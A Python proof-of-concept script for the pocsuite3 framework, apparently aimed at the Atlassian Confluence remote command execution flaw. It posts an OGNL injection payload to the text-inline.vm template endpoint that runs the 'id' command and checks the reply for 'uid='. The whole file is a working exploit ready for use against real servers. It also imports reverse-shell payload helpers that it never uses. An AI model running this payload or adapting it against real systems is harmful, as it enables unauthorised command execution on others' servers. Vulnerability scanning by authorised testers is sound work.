# _*_ coding:utf-8 _*_
# @Time : 2024/1/25
# @Author: 炼金术师诸葛亮
from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD, random_str

class Atlassian_Confluence_rce(POCBase):
    pocDesc = '''Atlassian Confluence 远程命令执行漏洞'''
    author = '炼金术师诸葛亮'
    createDate = '2024-1-25'
    name = 'Atlassian Confluence 远程命令执行漏洞'
    #app="Atlassian-Confluence"

    def _verify(self):

        result = {}
        url = self.url+ '/template/aui/text-inline.vm'
        headers={
            "User-Agent": "python-requests/2.26.0",
            "Accept": "*/*",
            'Connection': 'close',
            'Accept-Encoding': 'gzip, deflate',
            'Content-Type': 'application/x-www-form-urlencoded'
        }


        try:

            data= "label=\u0027%2b#request\u005b\u0027.KEY_velocity.struts2.context\u0027\u005d.internalGet(\u0027ognl\u0027).findValue(#parameters.x,{})%2b\u0027&x=@org.apache.struts2.ServletActionContext@getResponse().setHeader('Poc_Cmd-Response',(new freemarker.template.utility.Execute()).exec({'id'}))"
            response = requests.post(url,headers=headers,data=data)
            if response.status_code == 200 and 'uid=' in response.text:
                result['VerifyInfo'] = {}


            return self.parse_output(result)
        except Exception as e:
            pass

register_poc(Atlassian_Confluence_rce)
